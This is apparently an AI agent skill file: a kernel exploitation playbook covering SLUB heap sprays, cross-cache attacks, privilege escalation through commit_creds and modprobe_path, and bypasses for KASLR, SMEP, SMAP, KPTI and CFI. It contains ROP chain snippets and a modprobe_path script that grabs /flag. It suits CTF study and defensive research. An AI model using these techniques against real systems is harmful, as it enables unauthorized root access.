---
name: pwn-kernel
description: >-
  Kernel exploitation playbook. Covers vulnerability types (UAF/race/OOB/type confusion), exploitation primitives (msg_msg/pipe_buffer/sk_buff/setxattr), privilege escalation (commit_creds/modprobe_path/core_pattern), mitigation bypass (KASLR 9-bit/SMEP/SMAP/KPTI trampoline/kCFI), and cross-cache techniques. Load for kernel CTF pwn or real-world LPE via kernel bugs.
---

# Kernel Exploitation — Complete Playbook

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Kernel Exploitation Core |
| 2 | Kernel Heap Techniques |
| 3 | Kernel Mitigation Bypass |

---
# Part 1: Kernel Exploitation Core


# SKILL: Linux Kernel Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert kernel exploitation techniques. Covers environment setup (QEMU), vulnerability classes, privilege escalation targets, kernel ROP, ret2usr, stack pivoting, and cross-cache attacks. Distilled from ctf-wiki kernel-mode sections and real-world kernel CVEs. Base models often confuse user-mode and kernel-mode exploitation constraints, especially regarding SMEP/SMAP/KPTI.

## 0. RELATED ROUTING

- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — userspace protections (NX, ASLR) also apply in kernel context
- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — kernel ROP reuses many userspace ROP concepts
- [heap-exploitation](../heap-exploitation/SKILL.md) — kernel SLUB is conceptually related to userspace heap
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — non-exploit kernel privesc techniques

### Advanced References

- [KERNEL_MITIGATION_BYPASS.md](./KERNEL_MITIGATION_BYPASS.md) — KASLR, SMEP, SMAP, KPTI, FG-KASLR, CFI bypass techniques
- [KERNEL_HEAP_TECHNIQUES.md](./KERNEL_HEAP_TECHNIQUES.md) — SLUB internals, cross-cache attacks, msg_msg/pipe_buffer/sk_buff exploitation


## 1. EXPLOITATION MODEL

```
┌─────────────────────────────────────────────────────┐
│  1. Find Vulnerability                              │
│     (UAF, OOB, race, integer overflow, type confusion)│
├─────────────────────────────────────────────────────┤
│  2. Build Primitive                                 │
│     (arbitrary read, arbitrary write, controlled RIP)│
├─────────────────────────────────────────────────────┤
│  3. Bypass Mitigations                              │
│     (KASLR, SMEP, SMAP, KPTI)                     │
├─────────────────────────────────────────────────────┤
│  4. Escalate Privileges                             │
│     (commit_creds, modprobe_path, namespace escape)  │
├─────────────────────────────────────────────────────┤
│  5. Return to Userspace Cleanly                     │
│     (KPTI trampoline, iretq/sysretq, swapgs)       │
└─────────────────────────────────────────────────────┘
```

---

## 2. ENVIRONMENT SETUP

### QEMU + Custom Kernel

```bash
# Download and compile kernel
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.1.tar.xz
tar xf linux-6.1.tar.xz && cd linux-6.1
make defconfig
# Disable mitigations for easier debugging:
scripts/config --disable RANDOMIZE_BASE      # KASLR
scripts/config --disable RANDOMIZE_LAYOUT    # FG-KASLR
scripts/config --enable DEBUG_INFO
make -j$(nproc)

# Boot with QEMU
qemu-system-x86_64 \
  -kernel bzImage \
  -initrd rootfs.cpio.gz \
  -append "console=ttyS0 nokaslr quiet" \
  -nographic \
  -s -S \    # GDB server on :1234, pause at start
  -monitor /dev/null \
  -m 256M \
  -cpu kvm64,+smep,+smap
```

### GDB Debugging

```bash
gdb vmlinux
target remote :1234
# Load kernel symbols
add-symbol-file vmlinux 0xffffffff81000000  # typical .text base
# Breakpoints
b commit_creds
b *0xffffffff81234567
# pwndbg/GEF work with kernel debugging
```

### initramfs Modification

```bash
mkdir rootfs && cd rootfs
cpio -idmv < ../rootfs.cpio.gz
# Edit init script, add exploit binary
cp /path/to/exploit ./
# Repack
find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz
```

---

## 3. COMMON VULNERABILITY TYPES

| Type | Description | Kernel Example |
|---|---|---|
| UAF | Object freed but pointer still accessible | CVE-2022-0847 (DirtyPipe) |
| OOB Read/Write | Array index or size check missing | CVE-2021-22555 (Netfilter) |
| Race Condition | TOCTOU between check and use | CVE-2016-5195 (DirtyCow) |
| Integer Overflow | Size calculation wraps around | Various ioctl handlers |
| Type Confusion | Object cast to wrong type | CVE-2023-0179 (Netfilter) |
| Double Free | Object freed twice | SLUB allocator exploitation |
| Stack Overflow | Kernel stack buffer overflow | Rare (kernel stack is small: 8KB–16KB) |

---

## 4. PRIVILEGE ESCALATION TARGETS

### Method 1: commit_creds(prepare_kernel_cred(0))

```c
// Kernel function that sets current process credentials to root
void (*commit_creds)(void *) = COMMIT_CREDS_ADDR;
void *(*prepare_kernel_cred)(void *) = PREPARE_KERNEL_CRED_ADDR;
commit_creds(prepare_kernel_cred(0));  // cred with uid=0, gid=0
```

Kernel ROP chain equivalent:
```
pop rdi; ret
0                          # NULL → prepare_kernel_cred(NULL) = init_cred
prepare_kernel_cred addr
mov rdi, rax; ... ; ret    # or pop rdi + known location
commit_creds addr
kpti_trampoline / swapgs+iretq  # return to userspace
```

### Method 2: modprobe_path Overwrite

```c
// modprobe_path = "/sbin/modprobe" in kernel .data
// Overwrite to "/tmp/x" → trigger with unknown binary format → kernel runs /tmp/x as root
```

```bash
# Setup:
echo '#!/bin/sh' > /tmp/x
echo 'cp /flag /tmp/flag && chmod 777 /tmp/flag' >> /tmp/x
chmod +x /tmp/x
# Trigger (unknown binary format):
echo -ne '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy  # kernel calls modprobe_path → /tmp/x runs as root
```

### Method 3: cred Structure Direct Overwrite

If you can find the current task's `cred` pointer and have arbitrary write, directly zero out uid/gid fields in the cred structure.

### Method 4: Namespace Escape (Containers)

Overwrite `init_nsproxy` or manipulate namespace pointers to escape container isolation.

---

## 5. KERNEL ROP

### Controlled RIP Sources

| Source | Mechanism |
|---|---|
| Corrupted function pointer | UAF object has vtable-like dispatch → overwrite pointer |
| Corrupted return address | Kernel stack overflow (rare) |
| Corrupted `ops` structure | Module operations struct (file_operations, seq_operations) |

### seq_operations Hijack (Common CTF Pattern)

```c
struct seq_operations {
    void * (*start)(struct seq_file *, loff_t *);
    void (*stop)(struct seq_file *, void *);
    void * (*next)(struct seq_file *, void *, loff_t *);
    int (*show)(struct seq_file *, void *);
};
// Size: 0x20 (fits in kmalloc-32)
// Open /proc/self/stat → allocates seq_operations
// UAF overwrite start → controlled RIP when read() is called
```

### Stack Pivoting in Kernel

| Gadget | Usage |
|---|---|
| `xchg eax, esp; ret` | Pivot to address in lower 32 bits of RAX (mmap buffer at known addr) |
| `mov rsp, [rdi+X]; ...` | If RDI points to controlled data |
| `push rdi; pop rsp; ...` | Pivot to RDI (first arg of hijacked function) |

**Important**: After SMEP, cannot execute userspace code. ROP chain must use **kernel gadgets** only.

---

## 6. ret2usr (Pre-SMEP)

Directly call a userspace function from kernel context:

```c
void escalate() {
    commit_creds(prepare_kernel_cred(0));
}
// Overwrite kernel function pointer to point to escalate() in user memory
```

**Blocked by**: SMEP (Supervisor Mode Execution Prevention) — kernel cannot execute user-mapped pages.

---

## 7. RETURNING TO USERSPACE

After privilege escalation in kernel, must return cleanly to userspace to get a root shell.

### Via iretq (Traditional)

```nasm
; ROP chain ending:
swapgs                     ; swap GS base back to userspace
iretq                      ; pops: RIP, CS, RFLAGS, RSP, SS from stack
; Stack must contain: [user_rip][user_cs][user_rflags][user_rsp][user_ss]
```

```python
# Save userspace state before entering kernel
user_cs = 0x33
user_ss = 0x2b
user_rflags = # saved via pushfq before exploit
user_rsp = # saved RSP
user_rip = # address of post-exploit function (e.g., get_shell)
```

### Via KPTI Trampoline (When KPTI Enabled)

KPTI separates kernel/user page tables. Direct `swapgs; iretq` crashes because user pages aren't mapped. Use the kernel's own return trampoline:

```
# KPTI trampoline (in kernel at known offset):
# swapgs_restore_regs_and_return_to_usermode:
#   mov rdi, rsp
#   ...
#   swapgs
#   iretq
# Jump to trampoline with [RIP, CS, RFLAGS, RSP, SS] on stack
```

### Via signal Handler Return

Set up a signal handler before exploit. After `commit_creds`, trigger the signal → return to userspace via signal handler (avoids manual swapgs/iretq).

---

## 8. QEMU DEBUGGING TIPS

| Command | Purpose |
|---|---|
| `-s -S` | GDB server on :1234, paused |
| `-monitor /dev/null` | Disable QEMU monitor (cleaner output) |
| `-append "nokaslr"` | Disable KASLR for debugging |
| `-cpu kvm64,+smep,+smap` | Enable specific CPU features |
| `info registers` (GDB) | Show all register values |
| `maintenance packet Qqemu.PhyMemMode:1` | Read physical memory in GDB |
| `cat /proc/kallsyms` | Kernel symbol addresses (if readable) |
| `cat /sys/kernel/notes` | Kernel build ID |

---

## 9. DECISION TREE

```
Kernel vulnerability identified
├── What type?
│   ├── UAF → identify freed object, spray replacement (see KERNEL_HEAP_TECHNIQUES)
│   ├── OOB → determine read/write range, target adjacent objects
│   ├── Race condition → reliable trigger (userfaultfd, FUSE)
│   ├── Integer overflow → how does it translate to OOB or allocation confusion?
│   └── Type confusion → what can the confused type access?
│
├── Build primitive
│   ├── Controlled RIP? → kernel ROP or ret2usr (if no SMEP)
│   ├── Arbitrary read? → leak KASLR base, then controlled RIP
│   ├── Arbitrary write? → modprobe_path overwrite (simplest)
│   │                      or overwrite cred structure directly
│   └── Limited write? → target function pointer in known object
│
├── Mitigations (see KERNEL_MITIGATION_BYPASS.md)
│   ├── KASLR → need info leak first (/proc/kallsyms if readable, timing, or OOB read)
│   ├── SMEP → kernel ROP only (no user code exec)
│   ├── SMAP → cannot read user data from kernel (use copy_from_user gadget)
│   ├── KPTI → use KPTI trampoline for clean return
│   └── FG-KASLR → function offsets randomized (use data section targets like modprobe_path)
│
├── Escalation method
│   ├── Have controlled RIP + KASLR bypass → ROP chain: prepare_kernel_cred(0) → commit_creds
│   ├── Have arbitrary write only → modprobe_path overwrite
│   ├── Have arbitrary write + KASLR bypass → overwrite cred uid/gid to 0
│   └── Have controlled function call → call commit_creds(prepare_kernel_cred(0))
│
└── Return to userspace
    ├── KPTI disabled → swapgs; iretq (ROP ending)
    ├── KPTI enabled → jump to KPTI trampoline
    └── Alternative → signal handler + process_one_work return path
```


---
# Part 2: Kernel Heap Techniques


## 1. SLUB ALLOCATOR OVERVIEW

Linux kernel uses SLUB (Unqueued Slab Allocator) for small kernel object allocation.

### Key Concepts

| Concept | Description |
|---|---|
| Slab | Contiguous pages holding objects of the same size |
| Cache | Named pool for specific object types (e.g., `kmalloc-64`, `task_struct`) |
| Freelist | Per-CPU linked list of free objects within a slab |
| Partial list | Per-node list of slabs with some free objects |
| Generic caches | `kmalloc-{32,64,96,128,192,256,512,...}` for generic allocations |

### Object Layout in Slab

```
┌─────────┬─────────┬─────────┬─────────┐
│ Object0 │ Object1 │ Object2 │ Object3 │  ← one slab page
└─────────┴─────────┴─────────┴─────────┘
  FP→Obj2   FP→Obj3   FP→NULL   (allocated)

FP = freelist pointer (stored at object start or random offset)
```

### Freelist Randomization (SLAB_FREELIST_RANDOM)

Object allocation order within a slab is randomized. Affects heap spray reliability.

### Freelist Hardening (SLAB_FREELIST_HARDENED)

```c
// Freelist pointer is XOR'd with a random value and the address
// Similar to glibc safe-linking
stored_fp = ptr ^ random_value ^ &stored_fp
```


## 2. SLAB OBJECT LIFECYCLE

```
kmalloc(size, GFP_KERNEL)
  → Check per-CPU freelist (fastest)
  → Check per-CPU partial list
  → Check per-node partial list
  → Allocate new slab pages

kfree(ptr)
  → Return to per-CPU freelist (if same CPU and slab)
  → Return to per-node partial list
  → Free slab pages (if all objects freed)
```

### Heap Spray Strategy

1. Identify target slab cache (based on object size)
2. Drain existing free objects (spray dummy allocations)
3. Trigger vulnerability (UAF/OOB on target object)
4. Spray replacement objects (same size → land in freed slot)

---

## 3. CROSS-CACHE ATTACK

**Exploit UAF across different slab caches by forcing page-level reuse.**

### Why Cross-Cache?

Many kernel objects have dedicated caches (e.g., `struct cred` in `cred_jar`, not `kmalloc-192`). Cannot spray `kmalloc-192` to replace a freed `cred` object. Cross-cache forces the slab pages to be returned to the page allocator and reallocated to a different cache.

### Methodology

```
1. Spray target objects to fill slabs        [Target slab: all allocated]
2. Free target objects (leave one page worth) [Target slab: one partial page]
3. Free ALL objects in that page              [Page returned to page allocator]
4. Spray attacker objects (different cache)   [Page reallocated to attacker cache]
5. UAF on target object now aliases attacker object on same physical page
```

### Page-Level UAF Steps

```c
// Phase 1: Fill target cache so new slabs are allocated
for (int i = 0; i < SPRAY_COUNT; i++)
    target_alloc();  // allocate target objects

// Phase 2: Create hole pattern (free specific objects to isolate one slab page)
// Free all objects in one specific slab page
for (int i = PAGE_START; i < PAGE_START + OBJS_PER_PAGE; i++)
    target_free(i);

// Phase 3: Victim object freed (UAF) — was on the now-freed page
trigger_uaf();

// Phase 4: Page is returned to buddy allocator
// Phase 5: Reallocate page into attacker's cache
for (int i = 0; i < SPRAY_COUNT; i++)
    attacker_alloc();  // e.g., msgsnd() for msg_msg
```

---

## 4. msg_msg EXPLOITATION

`struct msg_msg` is allocated via `msgsnd()` and freed via `msgrcv()`. Highly flexible size (48-byte header + arbitrary data).

### Structure Layout

```c
struct msg_msg {
    struct list_head m_list;  // 0x00: prev/next pointers
    long m_type;              // 0x10: message type
    size_t m_ts;              // 0x18: total message size
    struct msg_msgseg *next;  // 0x20: pointer to continuation segment
    void *security;           // 0x28: SELinux label
    // user data starts at offset 0x30
};
```

### Exploitation Patterns

| Technique | Method |
|---|---|
| Arbitrary read | UAF/OOB: corrupt `m_ts` to large value → `msgrcv()` reads past message boundary |
| Arbitrary read (chained) | Corrupt `next` pointer to target address → `msgrcv()` follows chain, reads target data |
| Heap spray | `msgsnd()` with controlled size → lands in target kmalloc cache |
| Flexible size | Data size → allocates from `kmalloc-{64,96,128,...,4096}` or `kmalloc-cg-*` |

```python
# msg_msg for heap spray (pseudo)
import ctypes
# msg_msg header = 0x30 bytes
# To hit kmalloc-64: send 64 - 0x30 = 0x30 bytes of data
# To hit kmalloc-96: send 96 - 0x30 = 0x60 bytes of data

# For reading: after corrupting m_ts or next:
msgrcv(qid, buf, large_size, type, IPC_NOWAIT | MSG_COPY)
# MSG_COPY: read without removing → allows repeated reads
```

---

## 5. pipe_buffer EXPLOITATION

`struct pipe_buffer` is allocated when using `pipe()` and `splice()`. 

### Structure Layout

```c
struct pipe_buffer {
    struct page *page;              // 0x00
    unsigned int offset, len;       // 0x08
    const struct pipe_buf_operations *ops;  // 0x10 ← function pointer table
    unsigned int flags;             // 0x18
    unsigned long private;          // 0x20
};
// Size: 0x28 per buffer, 16 buffers per pipe → one allocation = 0x280
```

### Exploitation

| Technique | Method |
|---|---|
| RIP control | UAF overwrite `ops` pointer → `pipe_release()` calls `ops->release` |
| KASLR leak | Read `ops` pointer → `anon_pipe_buf_ops` at known kernel offset |
| Page reference | Corrupt `page` pointer → reference arbitrary physical page |

```c
// To allocate pipe_buffers:
int fd[2];
pipe(fd);
// Write > PIPE_BUF to allocate pipe_buffer array
write(fd[1], buf, PIPE_BUF + 1);  // or use splice() + F_SETPIPE_SZ

// Trigger: close(fd[0]) or close(fd[1]) → calls ops->release
```

### DirtyPipe (CVE-2022-0847)

Abused `pipe_buffer` flags: `PIPE_BUF_FLAG_CAN_MERGE` set on a page from `splice()` → subsequent `write()` to pipe overwrites the page cache of any file, including read-only files.

---

## 6. sk_buff EXPLOITATION

`struct sk_buff` (socket buffer) is used for network packet handling. Flexible size, controllable data.

### Key Properties

| Property | Value |
|---|---|
| Allocation | `kmalloc-*` or dedicated slab depending on size |
| Data control | Full control over packet payload |
| Spray | Send UDP/TCP packets → allocates sk_buff with controlled data |
| Read back | Receive packets → reads sk_buff data |
| Timing | Network operations can be timed for race conditions |

### Spray Technique

```c
// Create socket
int sock = socket(AF_INET, SOCK_DGRAM, 0);
// Spray: send many UDP packets (each allocates sk_buff + data)
for (int i = 0; i < SPRAY_N; i++) {
    sendto(sock, payload, size, MSG_DONTWAIT, &addr, sizeof(addr));
}
// Payload data appears in kmalloc-* slab
// Reclaim by recvfrom() or let socket close
```

---

## 7. setxattr / userfaultfd / FUSE PRIMITIVES

### setxattr (Universal Heap Write)

```c
// setxattr allocates a temporary kernel buffer with arbitrary size and content
// then copies user data → kernel buffer → frees buffer
// Useful for: spraying any kmalloc cache, timing attacks
setxattr("/tmp/x", "user.attr", payload, size, XATTR_CREATE);
// Buffer is kmalloc'd with controlled size and content, then freed
// Race: userfaultfd on payload page to pause between alloc and free
```

### userfaultfd (Race Condition Stabilizer)

Register a user-mode handler for page faults. When kernel accesses a userfaultfd-registered page, execution pauses until userspace handler responds → deterministic race window.

```c
// 1. Register userfaultfd on a mapped page
// 2. Trigger kernel operation that accesses this page
// 3. Kernel blocks in page fault → do heap manipulation in another thread
// 4. Resolve page fault → kernel continues with manipulated heap
```

**Restriction**: `userfaultfd` may require `CAP_SYS_PTRACE` on newer kernels (≥ 5.11 with sysctl `vm.unprivileged_userfaultfd=0`).

### FUSE (Alternative to userfaultfd)

Mount a FUSE filesystem. Kernel reads from FUSE file → blocks until userspace FUSE handler responds. Same race window effect as userfaultfd.

---

## 8. COMMON KERNEL OBJECT SIZE TABLE

| Object | Size (x86-64) | Slab Cache |
|---|---|---|
| `seq_operations` | 0x20 | kmalloc-32 |
| `msg_msg` (header only) | 0x30 + data | kmalloc-64 to kmalloc-4096 |
| `subprocess_info` | 0x60 | kmalloc-96 |
| `shm_file_data` | 0x20 | kmalloc-32 |
| `pipe_buffer` × 16 | 0x280 | kmalloc-1024 |
| `sk_buff` (head) | ~0xE0 | skbuff_head_cache |
| `cred` | 0xA8 | cred_jar (dedicated) |
| `file` | 0x100 | filp (dedicated) |
| `inode` | varies | inode_cache (dedicated) |
| `tty_struct` | 0x2B8 | kmalloc-1024 |
| `timerfd_ctx` | 0x68 | kmalloc-128 |
| `poll_list` | 0x10 + variable | kmalloc-32 to kmalloc-4096 |

---

## 9. TECHNIQUE SELECTION

```
Kernel UAF/OOB in which cache?
├── Same as generic kmalloc-{N}?
│   └── Direct spray: msg_msg, sk_buff, setxattr, add_key
├── Dedicated cache (cred_jar, filp, etc.)?
│   └── Cross-cache attack needed:
│       1. Drain target cache → force new slab pages
│       2. Free all objects in target slab page
│       3. Page returns to buddy allocator
│       4. Spray generic objects → page reallocated to attacker cache
├── What primitive do you need?
│   ├── Controlled RIP → spray pipe_buffer (ops pointer) or seq_operations
│   ├── Arbitrary read → spray msg_msg (corrupt m_ts or next)
│   ├── Arbitrary write → spray msg_msg + modify → msgrcv for reclaim
│   └── KASLR leak → spray pipe_buffer → read ops (kernel .text pointer)
└── Race condition stabilization?
    ├── userfaultfd available → register on target page
    ├── FUSE available → mount FUSE filesystem
    └── Neither → timing-based (less reliable)
```


---
# Part 3: Kernel Mitigation Bypass


## 1. KASLR (Kernel Address Space Layout Randomization)

Randomizes kernel .text base address at boot. Typical entropy: 9 bits (512 possible positions) on x86-64.

### Leak Methods

| Method | Condition | Detail |
|---|---|---|
| `/proc/kallsyms` | Root or `kptr_restrict=0` | Direct symbol addresses (not available in CTF usually) |
| Kernel OOB read | Exploitable OOB | Read kernel pointers from adjacent memory |
| Uninitialized memory | Kernel stack/heap leak | Leaked pointer reveals kernel base |
| dmesg / printk | Kernel prints addresses | `dmesg_restrict=0` or exploitable read |
| CPU side channel | Spectre/Meltdown variants | Timing-based KASLR bypass (mostly patched) |
| `/proc/self/stat` | `wait_channel` field | May expose kernel addresses (kernel-dependent) |
| eBPF JIT spray | eBPF available | JIT code at predictable offsets from base |
| Module base | Known module loaded | Module base leaks relative to kernel base |
| Entropy brute-force | 9 bits | 512 attempts (feasible for persistent service) |

### KASLR Base Calculation

```python
# Leaked address from kernel: 0xffffffff81234567 (example)
# Known symbol offset from vmlinux: commit_creds = 0xffffffff81095c30 (no KASLR base)
# Actual offset: 0x95c30
# KASLR base = leaked_addr - symbol_offset_in_vmlinux
kaslr_base = (leaked_addr & ~0xfffff) - (known_symbol & ~0xfffff)
```


## 2. SMEP (Supervisor Mode Execution Prevention)

**Prevents kernel from executing code in user-mapped pages.** Set via CR4 bit 20.

### Bypass Methods

| Method | Detail |
|---|---|
| Kernel ROP | Use only kernel .text gadgets for ROP chain (standard approach) |
| CR4 bit flip | `mov cr4, rax` gadget with bit 20 cleared (blocked on modern kernels with CR4 pinning) |
| JIT code | Execute JIT-compiled code (eBPF, kprobes) which lives in kernel memory |
| Copy shellcode to kernel | Write shellcode to kernel-mapped page, then execute |

### CR4 Flip (Legacy, < 4.15)

```python
# CR4 value with SMEP: 0x1006f0 (bit 20 set)
# CR4 value without SMEP: 0x0006f0 (bit 20 clear)
# ROP gadget: pop rcx; ret → mov cr4, rcx; ret
rop = p64(pop_rcx) + p64(0x6f0) + p64(mov_cr4_rcx)
# After CR4 flip, can jump to user-mapped shellcode
```

**Modern kernels** (≥ 4.15): CR4 pinning via `native_write_cr4()` checks prevent clearing SMEP/SMAP bits. Must use pure kernel ROP.

---

## 3. SMAP (Supervisor Mode Access Prevention)

**Prevents kernel from reading/writing user-mapped pages.** Set via CR4 bit 21.

### Impact

```c
// Without SMAP: kernel exploit can read fake structures from user mmap
char *fake = mmap(0x10000, ...);  // user page
// Copy fake data setup
// Kernel dereferences pointer to 0x10000 → reads user data ✓

// With SMAP: above access faults
// Must use kernel-mapped memory for all fake structures
```

### Bypass Methods

| Method | Detail |
|---|---|
| Kernel heap spray | Place fake structures in kernel heap (not user memory) |
| `copy_from_user` gadget | Legitimate kernel function that copies from user to kernel buffer |
| `stac`/`clac` gadgets | Temporarily enable user access (rare in ROP chains) |
| CR4 bit flip | Clear bit 21 (same caveats as SMEP) |
| Pipe/userfaultfd | Stage controlled data in kernel memory via legitimate interfaces |

---

## 4. KPTI (Kernel Page Table Isolation)

**Separates kernel and user page tables.** When running in userspace, kernel pages are unmapped (except trampoline). Blocks Meltdown and complicates kernel→user return.

### Impact on Exploitation

```
Without KPTI: swapgs; iretq → works directly
With KPTI: swapgs; iretq → crashes (user page table doesn't map kernel)
          Must switch page tables before returning to userspace
```

### Bypass: KPTI Trampoline

The kernel provides `swapgs_restore_regs_and_return_to_usermode` (or equivalent) that:
1. Switches from kernel to user page tables (writes CR3)
2. Executes `swapgs`
3. Executes `iretq`

```python
# Find trampoline address
# In vmlinux: search for "swapgs_restore_regs_and_return_to_usermode"
kpti_tramp = kaslr_base + KPTI_TRAMP_OFFSET

# ROP chain ending:
# ... commit_creds(prepare_kernel_cred(0)) ...
rop += p64(kpti_tramp)
rop += p64(0)              # padding (popped by trampoline)
rop += p64(0)              # padding
rop += p64(user_rip)       # return RIP (e.g., get_shell function)
rop += p64(user_cs)        # CS = 0x33
rop += p64(user_rflags)    # saved RFLAGS
rop += p64(user_rsp)       # saved RSP
rop += p64(user_ss)        # SS = 0x2b
```

### Signal Handler Technique

Alternative: set up a signal handler before the exploit. After `commit_creds` in kernel, cause a fault → signal delivered to userspace → handler runs as root.

---

## 5. FG-KASLR (Function Granularity KASLR)

**Randomizes individual function addresses**, not just the base. Each function gets an independent random offset within the .text section.

### Impact

- `prepare_kernel_cred` and `commit_creds` are at unknown offsets (not base+fixed_offset)
- ROP gadgets within .text have unknown addresses
- Standard KASLR leak (base address) is insufficient

### What's NOT Randomized

| Section | Randomized? | Exploit Relevance |
|---|---|---|
| `.text` functions | YES | Cannot use for ROP or direct call |
| `.data` section | NO (base+offset fixed) | `modprobe_path`, `core_pattern` still at known offset from base |
| `.rodata` section | NO | Read-only data at known offset |
| Percpu variables | NO | |
| Exception tables | NO | |
| Kernel modules | Separate randomization | Module function offsets change independently |

### Bypass Strategies

| Strategy | Detail |
|---|---|
| Data-only attack | Overwrite `modprobe_path` (in .data, fixed offset from KASLR base) |
| Leak function pointers | Read function pointer from kernel object → derandomize specific functions |
| Use non-.text gadgets | Gadgets in modules, `.init.text` (if still mapped), or JIT code |
| Large-scale info leak | Leak many function pointers to reconstruct .text layout |

---

## 6. CLANG CFI (Control Flow Integrity)

**Validates indirect call/jump targets match expected function signature.** Enabled in Android kernels (GKI) and some hardened builds.

### How CFI Works

```c
// Before indirect call:
// Check: is target address a valid function with matching prototype?
// If not → __cfi_check fails → kernel panic
void (*fptr)(int) = ...;
// CFI check inserted here
fptr(42);
```

### Bypass Approaches

| Method | Detail |
|---|---|
| Same-type function | Redirect to a different function with the same signature |
| CFI shadow manipulation | Corrupt the CFI shadow map to whitelist arbitrary targets |
| Data-only attack | Avoid indirect calls entirely (overwrite data like modprobe_path) |
| JIT/BPF code | JIT-compiled code may not have CFI checks |
| kCFI bypass (specific) | kCFI uses type hash comparison — find hash collision or valid type match |

---

## 7. ADDITIONAL MITIGATIONS

### Stack Canary (Kernel)

Kernel functions have stack canaries (from `gs:[0x28]` on x86-64). Bypass same as userspace: info leak or avoid stack overflow.

### STATIC_USERMODEHELPER

Hardcodes the usermode helper path, preventing `modprobe_path` overwrite. Bypass: use alternative targets (`core_pattern`, direct cred overwrite).

### Lockdown LSM

Restricts certain operations even for root (prevents loading unsigned modules, accessing /dev/mem). Bypass requires kernel code execution first.

### RANDSTRUCT

Randomizes kernel structure layout at compile time. Offset of fields in `task_struct`, `cred`, etc. are unknown.

**Bypass**: Leak structure contents to determine field offsets, or target structures not covered by RANDSTRUCT.

---

## 8. MITIGATION INTERACTION MATRIX

| Attack | KASLR | SMEP | SMAP | KPTI | FG-KASLR |
|---|---|---|---|---|---|
| ret2usr | Need base | **Blocked** | Need kernel buf | — | Need func addr |
| Kernel ROP | Need base | OK (kernel gadgets) | Need kernel buf | Need trampoline | Need gadget addrs |
| modprobe_path | Need base | — | — | — | OK (data section) |
| commit_creds | Need base | — | — | Need trampoline | Need func addr |
| Direct cred overwrite | Need cred addr | — | — | — | OK (data) |
| Cross-cache overwrite | — | — | — | — | — |
